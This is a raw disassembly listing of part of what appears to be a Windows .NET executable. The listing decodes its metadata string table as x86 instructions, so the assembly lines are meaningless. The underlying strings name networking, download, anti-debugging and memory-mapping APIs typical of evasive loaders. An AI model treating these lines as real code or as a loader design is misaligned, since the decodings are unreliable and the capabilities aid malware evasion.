  406eb4:	74 65                	je     0x406f1b
  406eb6:	6d                   	insl   (%dx),%es:(%edi)
  406eb7:	2e 49                	cs dec %ecx
  406eb9:	4f                   	dec    %edi
  406eba:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  406ebe:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  406ec3:	79 49                	jns    0x406f0e
  406ec5:	6e                   	outsb  %ds:(%esi),(%dx)
  406ec6:	66 6f                	outsw  %ds:(%esi),(%dx)
  406ec8:	00 45 6e             	add    %al,0x6e(%ebp)
  406ecb:	64 4f                	fs dec %edi
  406ecd:	66 53                	push   %bx
  406ecf:	74 72                	je     0x406f43
  406ed1:	65 61                	gs popa
  406ed3:	6d                   	insl   (%dx),%es:(%edi)
  406ed4:	45                   	inc    %ebp
  406ed5:	78 63                	js     0x406f3a
  406ed7:	65 70 74             	gs jo  0x406f4e
  406eda:	69 6f 6e 00 46 69 6c 	imul   $0x6c694600,0x6e(%edi),%ebp
  406ee1:	65 00 4d 65          	add    %cl,%gs:0x65(%ebp)
  406ee5:	6d                   	insl   (%dx),%es:(%edi)
  406ee6:	6f                   	outsl  %ds:(%esi),(%dx)
  406ee7:	72 79                	jb     0x406f62
  406ee9:	53                   	push   %ebx
  406eea:	74 72                	je     0x406f5e
  406eec:	65 61                	gs popa
  406eee:	6d                   	insl   (%dx),%es:(%edi)
  406eef:	00 50 61             	add    %dl,0x61(%eax)
  406ef2:	74 68                	je     0x406f5c
  406ef4:	00 53 74             	add    %dl,0x74(%ebx)
  406ef7:	72 65                	jb     0x406f5e
  406ef9:	61                   	popa
  406efa:	6d                   	insl   (%dx),%es:(%edi)
  406efb:	00 49 6e             	add    %cl,0x6e(%ecx)
  406efe:	74 31                	je     0x406f31
  406f00:	36 00 49 6e          	add    %cl,%ss:0x6e(%ecx)
  406f04:	74 33                	je     0x406f39
  406f06:	32 00                	xor    (%eax),%al
  406f08:	49                   	dec    %ecx
  406f09:	6e                   	outsb  %ds:(%esi),(%dx)
  406f0a:	74 36                	je     0x406f42
  406f0c:	34 00                	xor    $0x0,%al
  406f0e:	49                   	dec    %ecx
  406f0f:	6e                   	outsb  %ds:(%esi),(%dx)
  406f10:	74 50                	je     0x406f62
  406f12:	74 72                	je     0x406f86
  406f14:	00 49 6e             	add    %cl,0x6e(%ecx)
  406f17:	76 61                	jbe    0x406f7a
  406f19:	6c                   	insb   (%dx),%es:(%edi)
  406f1a:	69 64 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esp
  406f21:	74 
  406f22:	69 6f 6e 45 78 63 65 	imul   $0x65637845,0x6e(%edi),%ebp
  406f29:	70 74                	jo     0x406f9f
  406f2b:	69 6f 6e 00 4d 69 73 	imul   $0x73694d00,0x6e(%edi),%ebp
  406f32:	73 69                	jae    0x406f9d
  406f34:	6e                   	outsb  %ds:(%esi),(%dx)
  406f35:	67 4d                	addr16 dec %ebp
  406f37:	65 74 68             	gs je  0x406fa2
  406f3a:	6f                   	outsl  %ds:(%esi),(%dx)
  406f3b:	64 45                	fs inc %ebp
  406f3d:	78 63                	js     0x406fa2
  406f3f:	65 70 74             	gs jo  0x406fb6
  406f42:	69 6f 6e 00 57 65 62 	imul   $0x62655700,0x6e(%edi),%ebp
  406f49:	43                   	inc    %ebx
  406f4a:	6c                   	insb   (%dx),%es:(%edi)
  406f4b:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  406f52:	73 74                	jae    0x406fc8
  406f54:	65 6d                	gs insl (%dx),%es:(%edi)
  406f56:	2e 4e                	cs dec %esi
  406f58:	65 74 00             	gs je  0x406f5b
  406f5b:	4e                   	dec    %esi
  406f5c:	6f                   	outsl  %ds:(%esi),(%dx)
  406f5d:	74 53                	je     0x406fb2
  406f5f:	75 70                	jne    0x406fd1
  406f61:	70 6f                	jo     0x406fd2
  406f63:	72 74                	jb     0x406fd9
  406f65:	65 64 45             	gs fs inc %ebp
  406f68:	78 63                	js     0x406fcd
  406f6a:	65 70 74             	gs jo  0x406fe1
  406f6d:	69 6f 6e 00 4f 62 6a 	imul   $0x6a624f00,0x6e(%edi),%ebp
  406f74:	65 63 74 00 4f       	arpl   %esi,%gs:0x4f(%eax,%eax,1)
  406f79:	70 65                	jo     0x406fe0
  406f7b:	72 61                	jb     0x406fde
  406f7d:	74 69                	je     0x406fe8
  406f7f:	6e                   	outsb  %ds:(%esi),(%dx)
  406f80:	67 53                	addr16 push %ebx
  406f82:	79 73                	jns    0x406ff7
  406f84:	74 65                	je     0x406feb
  406f86:	6d                   	insl   (%dx),%es:(%edi)
  406f87:	00 52 61             	add    %dl,0x61(%edx)
  406f8a:	6e                   	outsb  %ds:(%esi),(%dx)
  406f8b:	64 6f                	outsl  %fs:(%esi),(%dx)
  406f8d:	6d                   	insl   (%dx),%es:(%edi)
  406f8e:	00 41 73             	add    %al,0x73(%ecx)
  406f91:	73 65                	jae    0x406ff8
  406f93:	6d                   	insl   (%dx),%es:(%edi)
  406f94:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  406f98:	53                   	push   %ebx
  406f99:	79 73                	jns    0x40700e
  406f9b:	74 65                	je     0x407002
  406f9d:	6d                   	insl   (%dx),%es:(%edi)
  406f9e:	2e 52                	cs push %edx
  406fa0:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  406fa3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406fa8:	6e                   	outsb  %ds:(%esi),(%dx)
  406fa9:	00 41 73             	add    %al,0x73(%ecx)
  406fac:	73 65                	jae    0x407013
  406fae:	6d                   	insl   (%dx),%es:(%edi)
  406faf:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  406fb3:	6f                   	outsl  %ds:(%esi),(%dx)
  406fb4:	6d                   	insl   (%dx),%es:(%edi)
  406fb5:	70 61                	jo     0x407018
  406fb7:	6e                   	outsb  %ds:(%esi),(%dx)
  406fb8:	79 41                	jns    0x406ffb
  406fba:	74 74                	je     0x407030
  406fbc:	72 69                	jb     0x407027
  406fbe:	62 75 74             	bound  %esi,0x74(%ebp)
  406fc1:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406fc5:	73 65                	jae    0x40702c
  406fc7:	6d                   	insl   (%dx),%es:(%edi)
  406fc8:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  406fcc:	6f                   	outsl  %ds:(%esi),(%dx)
  406fcd:	6e                   	outsb  %ds:(%esi),(%dx)
  406fce:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  406fd4:	74 69                	je     0x40703f
  406fd6:	6f                   	outsl  %ds:(%esi),(%dx)
  406fd7:	6e                   	outsb  %ds:(%esi),(%dx)
  406fd8:	41                   	inc    %ecx
  406fd9:	74 74                	je     0x40704f
  406fdb:	72 69                	jb     0x407046
  406fdd:	62 75 74             	bound  %esi,0x74(%ebp)
  406fe0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406fe4:	73 65                	jae    0x40704b
  406fe6:	6d                   	insl   (%dx),%es:(%edi)
  406fe7:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  406feb:	6f                   	outsl  %ds:(%esi),(%dx)
  406fec:	70 79                	jo     0x407067
  406fee:	72 69                	jb     0x407059
  406ff0:	67 68 74 41 74 74    	addr16 push $0x74744174
  406ff6:	72 69                	jb     0x407061
  406ff8:	62 75 74             	bound  %esi,0x74(%ebp)
  406ffb:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406fff:	73 65                	jae    0x407066
  407001:	6d                   	insl   (%dx),%es:(%edi)
  407002:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  407006:	65 73 63             	gs jae 0x40706c
  407009:	72 69                	jb     0x407074
  40700b:	70 74                	jo     0x407081
  40700d:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407014:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40701b:	73 73                	jae    0x407090
  40701d:	65 6d                	gs insl (%dx),%es:(%edi)
  40701f:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  407023:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  40702a:	69 
  40702b:	6f                   	outsl  %ds:(%esi),(%dx)
  40702c:	6e                   	outsb  %ds:(%esi),(%dx)
  40702d:	41                   	inc    %ecx
  40702e:	74 74                	je     0x4070a4
  407030:	72 69                	jb     0x40709b
  407032:	62 75 74             	bound  %esi,0x74(%ebp)
  407035:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407039:	73 65                	jae    0x4070a0
  40703b:	6d                   	insl   (%dx),%es:(%edi)
  40703c:	62 6c 79 4e          	bound  %ebp,0x4e(%ecx,%edi,2)
  407040:	61                   	popa
  407041:	6d                   	insl   (%dx),%es:(%edi)
  407042:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407046:	73 65                	jae    0x4070ad
  407048:	6d                   	insl   (%dx),%es:(%edi)
  407049:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40704d:	72 6f                	jb     0x4070be
  40704f:	64 75 63             	fs jne 0x4070b5
  407052:	74 41                	je     0x407095
  407054:	74 74                	je     0x4070ca
  407056:	72 69                	jb     0x4070c1
  407058:	62 75 74             	bound  %esi,0x74(%ebp)
  40705b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40705f:	73 65                	jae    0x4070c6
  407061:	6d                   	insl   (%dx),%es:(%edi)
  407062:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407066:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40706d:	72 
  40706e:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407075:	73 73                	jae    0x4070ea
  407077:	65 6d                	gs insl (%dx),%es:(%edi)
  407079:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40707d:	72 61                	jb     0x4070e0
  40707f:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  407082:	61                   	popa
  407083:	72 6b                	jb     0x4070f0
  407085:	41                   	inc    %ecx
  407086:	74 74                	je     0x4070fc
  407088:	72 69                	jb     0x4070f3
  40708a:	62 75 74             	bound  %esi,0x74(%ebp)
  40708d:	65 00 4d 65          	add    %cl,%gs:0x65(%ebp)
  407091:	6d                   	insl   (%dx),%es:(%edi)
  407092:	62 65 72             	bound  %esp,0x72(%ebp)
  407095:	49                   	dec    %ecx
  407096:	6e                   	outsb  %ds:(%esi),(%dx)
  407097:	66 6f                	outsw  %ds:(%esi),(%dx)
  407099:	00 4d 65             	add    %cl,0x65(%ebp)
  40709c:	74 68                	je     0x407106
  40709e:	6f                   	outsl  %ds:(%esi),(%dx)
  40709f:	64 42                	fs inc %edx
  4070a1:	61                   	popa
  4070a2:	73 65                	jae    0x407109
  4070a4:	00 4d 65             	add    %cl,0x65(%ebp)
  4070a7:	74 68                	je     0x407111
  4070a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4070aa:	64 49                	fs dec %ecx
  4070ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4070ad:	66 6f                	outsw  %ds:(%esi),(%dx)
  4070af:	00 52 65             	add    %dl,0x65(%edx)
  4070b2:	73 6f                	jae    0x407123
  4070b4:	75 72                	jne    0x407128
  4070b6:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  4070b9:	61                   	popa
  4070ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4070bb:	61                   	popa
  4070bc:	67 65 72 00          	addr16 gs jb 0x4070c0
  4070c0:	53                   	push   %ebx
  4070c1:	79 73                	jns    0x407136
  4070c3:	74 65                	je     0x40712a
  4070c5:	6d                   	insl   (%dx),%es:(%edi)
  4070c6:	2e 52                	cs push %edx
  4070c8:	65 73 6f             	gs jae 0x40713a
  4070cb:	75 72                	jne    0x40713f
  4070cd:	63 65 73             	arpl   %esp,0x73(%ebp)
  4070d0:	00 43 6f             	add    %al,0x6f(%ebx)
  4070d3:	6d                   	insl   (%dx),%es:(%edi)
  4070d4:	70 69                	jo     0x40713f
  4070d6:	6c                   	insb   (%dx),%es:(%edi)
  4070d7:	61                   	popa
  4070d8:	74 69                	je     0x407143
  4070da:	6f                   	outsl  %ds:(%esi),(%dx)
  4070db:	6e                   	outsb  %ds:(%esi),(%dx)
  4070dc:	52                   	push   %edx
  4070dd:	65 6c                	gs insb (%dx),%es:(%edi)
  4070df:	61                   	popa
  4070e0:	78 61                	js     0x407143
  4070e2:	74 69                	je     0x40714d
  4070e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4070e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4070e6:	73 41                	jae    0x407129
  4070e8:	74 74                	je     0x40715e
  4070ea:	72 69                	jb     0x407155
  4070ec:	62 75 74             	bound  %esi,0x74(%ebp)
  4070ef:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  4070f3:	73 74                	jae    0x407169
  4070f5:	65 6d                	gs insl (%dx),%es:(%edi)
  4070f7:	2e 52                	cs push %edx
  4070f9:	75 6e                	jne    0x407169
  4070fb:	74 69                	je     0x407166
  4070fd:	6d                   	insl   (%dx),%es:(%edi)
  4070fe:	65 2e 43             	gs cs inc %ebx
  407101:	6f                   	outsl  %ds:(%esi),(%dx)
  407102:	6d                   	insl   (%dx),%es:(%edi)
  407103:	70 69                	jo     0x40716e
  407105:	6c                   	insb   (%dx),%es:(%edi)
  407106:	65 72 53             	gs jb  0x40715c
  407109:	65 72 76             	gs jb  0x407182
  40710c:	69 63 65 73 00 52 75 	imul   $0x75520073,0x65(%ebx),%esp
  407113:	6e                   	outsb  %ds:(%esi),(%dx)
  407114:	74 69                	je     0x40717f
  407116:	6d                   	insl   (%dx),%es:(%edi)
  407117:	65 43                	gs inc %ebx
  407119:	6f                   	outsl  %ds:(%esi),(%dx)
  40711a:	6d                   	insl   (%dx),%es:(%edi)
  40711b:	70 61                	jo     0x40717e
  40711d:	74 69                	je     0x407188
  40711f:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  407122:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  407129:	69 
  40712a:	62 75 74             	bound  %esi,0x74(%ebp)
  40712d:	65 00 53 75          	add    %dl,%gs:0x75(%ebx)
  407131:	70 70                	jo     0x4071a3
  407133:	72 65                	jb     0x40719a
  407135:	73 73                	jae    0x4071aa
  407137:	49                   	dec    %ecx
  407138:	6c                   	insb   (%dx),%es:(%edi)
  407139:	64 61                	fs popa
  40713b:	73 6d                	jae    0x4071aa
  40713d:	41                   	inc    %ecx
  40713e:	74 74                	je     0x4071b4
  407140:	72 69                	jb     0x4071ab
  407142:	62 75 74             	bound  %esi,0x74(%ebp)
  407145:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407149:	6d                   	insl   (%dx),%es:(%edi)
  40714a:	56                   	push   %esi
  40714b:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  407152:	74 74                	je     0x4071c8
  407154:	72 69                	jb     0x4071bf
  407156:	62 75 74             	bound  %esi,0x74(%ebp)
  407159:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  40715d:	73 74                	jae    0x4071d3
  40715f:	65 6d                	gs insl (%dx),%es:(%edi)
  407161:	2e 52                	cs push %edx
  407163:	75 6e                	jne    0x4071d3
  407165:	74 69                	je     0x4071d0
  407167:	6d                   	insl   (%dx),%es:(%edi)
  407168:	65 2e 49             	gs cs dec %ecx
  40716b:	6e                   	outsb  %ds:(%esi),(%dx)
  40716c:	74 65                	je     0x4071d3
  40716e:	72 6f                	jb     0x4071df
  407170:	70 53                	jo     0x4071c5
  407172:	65 72 76             	gs jb  0x4071eb
  407175:	69 63 65 73 00 47 75 	imul   $0x75470073,0x65(%ebx),%esp
  40717c:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  407183:	62 
  407184:	75 74                	jne    0x4071fa
  407186:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  40718a:	72 73                	jb     0x4071ff
  40718c:	68 61 6c 00 54       	push   $0x54006c61
  407191:	61                   	popa
  407192:	72 67                	jb     0x4071fb
  407194:	65 74 46             	gs je  0x4071dd
  407197:	72 61                	jb     0x4071fa
  407199:	6d                   	insl   (%dx),%es:(%edi)
  40719a:	65 77 6f             	gs ja  0x40720c
  40719d:	72 6b                	jb     0x40720a
  40719f:	41                   	inc    %ecx
  4071a0:	74 74                	je     0x407216
  4071a2:	72 69                	jb     0x40720d
  4071a4:	62 75 74             	bound  %esi,0x74(%ebp)
  4071a7:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  4071ab:	73 74                	jae    0x407221
  4071ad:	65 6d                	gs insl (%dx),%es:(%edi)
  4071af:	2e 52                	cs push %edx
  4071b1:	75 6e                	jne    0x407221
  4071b3:	74 69                	je     0x40721e
  4071b5:	6d                   	insl   (%dx),%es:(%edi)
  4071b6:	65 2e 56             	gs cs push %esi
  4071b9:	65 72 73             	gs jb  0x40722f
  4071bc:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4071c3:	52                   	push   %edx
  4071c4:	75 6e                	jne    0x407234
  4071c6:	74 69                	je     0x407231
  4071c8:	6d                   	insl   (%dx),%es:(%edi)
  4071c9:	65 4d                	gs dec %ebp
  4071cb:	65 74 68             	gs je  0x407236
  4071ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4071cf:	64 48                	fs dec %eax
  4071d1:	61                   	popa
  4071d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4071d3:	64 6c                	fs insb (%dx),%es:(%edi)
  4071d5:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4071d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4071da:	74 69                	je     0x407245
  4071dc:	6d                   	insl   (%dx),%es:(%edi)
  4071dd:	65 54                	gs push %esp
  4071df:	79 70                	jns    0x407251
  4071e1:	65 48                	gs dec %eax
  4071e3:	61                   	popa
  4071e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4071e5:	64 6c                	fs insb (%dx),%es:(%edi)
  4071e7:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4071eb:	72 69                	jb     0x407256
  4071ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4071ee:	67 00 53 74          	add    %dl,0x74(%bp,%di)
  4071f2:	72 69                	jb     0x40725d
  4071f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4071f5:	67 43                	addr16 inc %ebx
  4071f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4071f8:	6d                   	insl   (%dx),%es:(%edi)
  4071f9:	70 61                	jo     0x40725c
  4071fb:	72 69                	jb     0x407266
  4071fd:	73 6f                	jae    0x40726e
  4071ff:	6e                   	outsb  %ds:(%esi),(%dx)
  407200:	00 45 6e             	add    %al,0x6e(%ebp)
  407203:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407206:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40720d:	74 65                	je     0x407274
  40720f:	6d                   	insl   (%dx),%es:(%edi)
  407210:	2e 54                	cs push %esp
  407212:	65 78 74             	gs js  0x407289
  407215:	00 53 74             	add    %dl,0x74(%ebx)
  407218:	72 69                	jb     0x407283
  40721a:	6e                   	outsb  %ds:(%esi),(%dx)
  40721b:	67 42                	addr16 inc %edx
  40721d:	75 69                	jne    0x407288
  40721f:	6c                   	insb   (%dx),%es:(%edi)
  407220:	64 65 72 00          	fs gs jb 0x407224
  407224:	4d                   	dec    %ebp
  407225:	6f                   	outsl  %ds:(%esi),(%dx)
  407226:	6e                   	outsb  %ds:(%esi),(%dx)
  407227:	69 74 6f 72 00 53 79 	imul   $0x73795300,0x72(%edi,%ebp,2),%esi
  40722e:	73 
  40722f:	74 65                	je     0x407296
  407231:	6d                   	insl   (%dx),%es:(%edi)
  407232:	2e 54                	cs push %esp
  407234:	68 72 65 61 64       	push   $0x64616572
  407239:	69 6e 67 00 4d 75 74 	imul   $0x74754d00,0x67(%esi),%ebp
  407240:	65 78 00             	gs js  0x407243
  407243:	54                   	push   %esp
  407244:	68 72 65 61 64       	push   $0x64616572
  407249:	00 54 79 70          	add    %dl,0x70(%ecx,%edi,2)
  40724d:	65 00 55 49          	add    %dl,%gs:0x49(%ebp)
  407251:	6e                   	outsb  %ds:(%esi),(%dx)
  407252:	74 31                	je     0x407285
  407254:	36 00 55 49          	add    %dl,%ss:0x49(%ebp)
  407258:	6e                   	outsb  %ds:(%esi),(%dx)
  407259:	74 33                	je     0x40728e
  40725b:	32 00                	xor    (%eax),%al
  40725d:	55                   	push   %ebp
  40725e:	49                   	dec    %ecx
  40725f:	6e                   	outsb  %ds:(%esi),(%dx)
  407260:	74 36                	je     0x407298
  407262:	34 00                	xor    $0x0,%al
  407264:	56                   	push   %esi
  407265:	61                   	popa
  407266:	6c                   	insb   (%dx),%es:(%edi)
  407267:	75 65                	jne    0x4072ce
  407269:	54                   	push   %esp
  40726a:	79 70                	jns    0x4072dc
  40726c:	65 00 56 65          	add    %dl,%gs:0x65(%esi)
  407270:	72 73                	jb     0x4072e5
  407272:	69 6f 6e 00 56 6f 69 	imul   $0x696f5600,0x6e(%edi),%ebp
  407279:	64 00 3c 4d 6f 64 75 	add    %bh,%fs:0x6c75646f(,%ecx,2)
  407280:	6c 
  407281:	65 3e 00 02          	gs add %al,%ds:(%edx)
  407285:	00 02                	add    %al,(%edx)
  407287:	02 00                	add    (%eax),%al
  407289:	02 e2                	add    %dl,%ah
  40728b:	80 80 00 03 00 03 02 	addb   $0x2,0x3000300(%eax)
  407292:	00 03                	add    %al,(%ebx)
  407294:	e2 80                	loop   0x407216
  407296:	80 00 05             	addb   $0x5,(%eax)
  407299:	00 05 e2 80 80 00    	add    %al,0x8080e2
  40729f:	06                   	push   %es
  4072a0:	00 06                	add    %al,(%esi)
  4072a2:	e2 80                	loop   0x407224
  4072a4:	80 00 08             	addb   $0x8,(%eax)
  4072a7:	00 08                	add    %cl,(%eax)
  4072a9:	e2 80                	loop   0x40722b
  4072ab:	80 00 0e             	addb   $0xe,(%eax)
  4072ae:	00 0e                	add    %cl,(%esi)
  4072b0:	e2 80                	loop   0x407232
  4072b2:	80 00 0f             	addb   $0xf,(%eax)
  4072b5:	00 76 61             	add    %dh,0x61(%esi)
  4072b8:	6c                   	insb   (%dx),%es:(%edi)
  4072b9:	75 65                	jne    0x407320
  4072bb:	5f                   	pop    %edi
  4072bc:	5f                   	pop    %edi
  4072bd:	00 2e                	add    %ch,(%esi)
  4072bf:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4072c3:	00 02                	add    %al,(%edx)
  4072c5:	e2 80                	loop   0x407247
  4072c7:	83 e2 80             	and    $0xffffff80,%edx
  4072ca:	83 02 00             	addl   $0x0,(%edx)
  4072cd:	08 e2                	or     %ah,%dl
  4072cf:	80 83 e2 80 83 02 00 	addb   $0x0,0x28380e2(%ebx)
  4072d6:	02 e2                	add    %dl,%ah
  4072d8:	80 83 e2 80 83 03 00 	addb   $0x0,0x38380e2(%ebx)
  4072df:	2e 63 63 74          	arpl   %esp,%cs:0x74(%ebx)
  4072e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4072e4:	72 00                	jb     0x4072e6
  4072e6:	03 e2                	add    %edx,%esp
  4072e8:	80 83 e2 80 83 02 00 	addb   $0x0,0x28380e2(%ebx)
  4072ef:	47                   	inc    %edi
  4072f0:	65 74 45             	gs je  0x407338
  4072f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4072f4:	75 6d                	jne    0x407363
  4072f6:	65 72 61             	gs jb  0x40735a
  4072f9:	74 6f                	je     0x40736a
  4072fb:	72 00                	jb     0x4072fd
  4072fd:	06                   	push   %es
  4072fe:	e2 80                	loop   0x407280
  407300:	83 e2 80             	and    $0xffffff80,%edx
  407303:	83 02 00             	addl   $0x0,(%edx)
  407306:	49                   	dec    %ecx
  407307:	73 44                	jae    0x40734d
  407309:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40730d:	67 65 72 50          	addr16 gs jb 0x407361
  407311:	72 65                	jb     0x407378
  407313:	73 65                	jae    0x40737a
  407315:	6e                   	outsb  %ds:(%esi),(%dx)
  407316:	74 00                	je     0x407318
  407318:	43                   	inc    %ebx
  407319:	68 65 63 6b 52       	push   $0x526b6365
  40731e:	65 6d                	gs insl (%dx),%es:(%edi)
  407320:	6f                   	outsl  %ds:(%esi),(%dx)
  407321:	74 65                	je     0x407388
  407323:	44                   	inc    %esp
  407324:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407328:	67 65 72 50          	addr16 gs jb 0x40737c
  40732c:	72 65                	jb     0x407393
  40732e:	73 65                	jae    0x407395
  407330:	6e                   	outsb  %ds:(%esi),(%dx)
  407331:	74 00                	je     0x407333
  407333:	43                   	inc    %ebx
  407334:	6c                   	insb   (%dx),%es:(%edi)
  407335:	6f                   	outsl  %ds:(%esi),(%dx)
  407336:	73 65                	jae    0x40739d
  407338:	48                   	dec    %eax
  407339:	61                   	popa
  40733a:	6e                   	outsb  %ds:(%esi),(%dx)
  40733b:	64 6c                	fs insb (%dx),%es:(%edi)
  40733d:	65 00 46 72          	add    %al,%gs:0x72(%esi)
  407341:	65 65 4c             	gs gs dec %esp
  407344:	69 62 72 61 72 79 00 	imul   $0x797261,0x72(%edx),%esp
  40734b:	56                   	push   %esi
  40734c:	69 72 74 75 61 6c 50 	imul   $0x506c6175,0x74(%edx),%esi
  407353:	72 6f                	jb     0x4073c4
  407355:	74 65                	je     0x4073bc
  407357:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40735b:	72 65                	jb     0x4073c2
  40735d:	61                   	popa
  40735e:	74 65                	je     0x4073c5
  407360:	46                   	inc    %esi
  407361:	69 6c 65 41 00 43 72 	imul   $0x65724300,0x41(%ebp,%eiz,2),%ebp
  407368:	65 
  407369:	61                   	popa
  40736a:	74 65                	je     0x4073d1
  40736c:	46                   	inc    %esi
  40736d:	69 6c 65 4d 61 70 70 	imul   $0x69707061,0x4d(%ebp,%eiz,2),%ebp
  407374:	69 
  407375:	6e                   	outsb  %ds:(%esi),(%dx)
  407376:	67 41                	addr16 inc %ecx
  407378:	00 4d 61             	add    %cl,0x61(%ebp)
  40737b:	70 56                	jo     0x4073d3
  40737d:	69 65 77 4f 66 46 69 	imul   $0x6946664f,0x77(%ebp),%esp
  407384:	6c                   	insb   (%dx),%es:(%edi)
  407385:	65 00 6d 65          	add    %ch,%gs:0x65(%ebp)
  407389:	6d                   	insl   (%dx),%es:(%edi)
  40738a:	63 70 79             	arpl   %esi,0x79(%eax)
  40738d:	00 47 65             	add    %al,0x65(%edi)
  407390:	74 4d                	je     0x4073df
  407392:	6f                   	outsl  %ds:(%esi),(%dx)
  407393:	64 75 6c             	fs jne 0x407402
  407396:	65 49                	gs dec %ecx
  407398:	6e                   	outsb  %ds:(%esi),(%dx)
  407399:	66 6f                	outsw  %ds:(%esi),(%dx)
  40739b:	72 6d                	jb     0x40740a
  40739d:	61                   	popa
  40739e:	74 69                	je     0x407409
  4073a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4073a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4073a2:	00 49 73             	add    %cl,0x73(%ecx)
  4073a5:	57                   	push   %edi
  4073a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4073a7:	77 36                	ja     0x4073df
  4073a9:	34 50                	xor    $0x50,%al
  4073ab:	72 6f                	jb     0x40741c
  4073ad:	63 65 73             	arpl   %esp,0x73(%ebp)
  4073b0:	73 00                	jae    0x4073b2
  4073b2:	67 65 74 5f          	addr16 gs je 0x407415
  4073b6:	43                   	inc    %ebx
  4073b7:	75 72                	jne    0x40742b
  4073b9:	72 65                	jb     0x407420
  4073bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4073bc:	74 54                	je     0x407412
  4073be:	68 72 65 61 64       	push   $0x64616572
  4073c3:	00 67 65             	add    %ah,0x65(%edi)
  4073c6:	74 5f                	je     0x407427
  4073c8:	4d                   	dec    %ebp
  4073c9:	61                   	popa
  4073ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4073cb:	61                   	popa
  4073cc:	67 65 64 54          	addr16 gs fs push %esp
  4073d0:	68 72 65 61 64       	push   $0x64616572
  4073d5:	49                   	dec    %ecx
  4073d6:	64 00 57 72          	add    %dl,%fs:0x72(%edi)
  4073da:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%ebp,%eiz,2),%esi
  4073e1:	00 
  4073e2:	47                   	inc    %edi
  4073e3:	65 74 46             	gs je  0x40742c
  4073e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4073e7:	6c                   	insb   (%dx),%es:(%edi)
  4073e8:	64 65 72 50          	fs gs jb 0x40743c
  4073ec:	61                   	popa
  4073ed:	74 68                	je     0x407457
  4073ef:	00 43 6f             	add    %al,0x6f(%ebx)
  4073f2:	6d                   	insl   (%dx),%es:(%edi)
  4073f3:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  4073f6:	65 00 45 78          	add    %al,%gs:0x78(%ebp)
  4073fa:	69 73 74 73 00 4e 65 	imul   $0x654e0073,0x74(%ebx),%esi
  407401:	78 74                	js     0x407477
  407403:	00 44 6f 77          	add    %al,0x77(%edi,%ebp,2)
  407407:	6e                   	outsb  %ds:(%esi),(%dx)
  407408:	6c                   	insb   (%dx),%es:(%edi)
  407409:	6f                   	outsl  %ds:(%esi),(%dx)
